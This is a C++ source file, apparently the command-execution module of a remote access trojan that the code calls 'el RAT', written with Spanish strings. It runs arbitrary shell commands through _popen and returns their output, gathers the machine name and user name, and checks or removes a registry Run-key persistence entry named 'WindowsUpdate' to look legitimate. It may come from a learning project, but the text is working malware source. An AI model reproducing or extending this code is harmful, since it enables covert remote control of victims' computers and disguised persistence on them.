//Sofía Martínez Cisneros
#include "Exec.h"
#include "Persist.h"
#include <iostream>
#include <cstdio>
#include <array>
#include <memory>
#include <windows.h>


std::string Exec::capturarComando() {
    std::string comando;
    std::cout << "Ingrese comando a ejecutar: ";
    std::getline(std::cin, comando);
    return comando;
}

std::string Exec::ejecutarComando(const std::string& comando) {
    if (comando == "persistencia_estado" || comando == "persistencia_eliminar") {
        std::string resultado;
        
        if (comando == "persistencia_estado") {
            if (Persist::verificarPersistencia("WindowsUpdate")) {
                resultado = "=== ESTADO DE PERSISTENCIA ===\n";
                resultado += "Estado: ACTIVA\n";
                resultado += "El RAT se ejecutará automáticamente al inicio del sistema\n";
                resultado += "Entrada en registro: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate\n";
            } else {
                resultado = "=== ESTADO DE PERSISTENCIA ===\n";
                resultado += "Estado: INACTIVA\n";
                resultado += "El RAT NO se ejecutará al inicio del sistema\n";
            }
        }
        else if (comando == "persistencia_eliminar") {
            resultado = "=== ELIMINACIÓN DE PERSISTENCIA ===\n";
            if (Persist::eliminarPersistencia("WindowsUpdate")) {
                resultado += "Resultado: EXITOSA\n";
                resultado += "La persistencia ha sido eliminada del registro\n";
                resultado += "El RAT ya no se ejecutará al inicio del sistema\n";
            } else {
                resultado += "Resultado: FALLIDA\n";
                resultado += "No se pudo eliminar la persistencia (puede que no existiera)\n";
            }
        }
        
        return resultado;
    }
    
    if (comando == "info_sistema") {
        std::string resultado = "=== INFORMACIÓN DEL SISTEMA ===\n";
        
        char computerName[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD size = sizeof(computerName);
        if (GetComputerNameA(computerName, &size)) {
            resultado += "Equipo: " + std::string(computerName) + "\n";
        }
        
        char userName[256];
        DWORD userNameSize = sizeof(userName);
        if (GetUserNameA(userName, &userNameSize)) {
            resultado += "Usuario: " + std::string(userName) + "\n";
        }
        
        if (Persist::verificarPersistencia("WindowsUpdate")) {
            resultado += "Persistencia: ACTIVA\n";
        } else {
            resultado += "Persistencia: INACTIVA\n";
        }
        
        return resultado;
    }
    
    if (comando == "ayuda" || comando == "help") {
        std::string resultado = "=== COMANDOS DISPONIBLES ===\n";
        resultado += "Comandos del sistema: dir, ipconfig, whoami, netstat, etc.\n";
        resultado += "persistencia_estado    - Muestra el estado de la persistencia\n";
        resultado += "persistencia_eliminar  - Elimina la persistencia del registro\n";
        resultado += "info_sistema          - Muestra información del sistema\n";
        resultado += "ayuda                 - Muestra esta ayuda\n";
        resultado += "exit o salir          - Cierra la conexión\n";
        return resultado;
    }
    
    std::array<char, 128> buffer;
    std::string resultado;
    
    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(comando.c_str(), "r"), _pclose);
    if (!pipe) {
        return "Error: No se pudo ejecutar el comando: " + comando;
    }
    
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        resultado += buffer.data();
    }
    
    int exitCode = _pclose(pipe.get());
    
    if (resultado.empty()) {
        resultado = "Comando ejecutado exitosamente. Código de salida: " + std::to_string(exitCode);
    } else {
        resultado += "\n--- Código de salida: " + std::to_string(exitCode) + " ---";
    }
    
    return resultado;
}
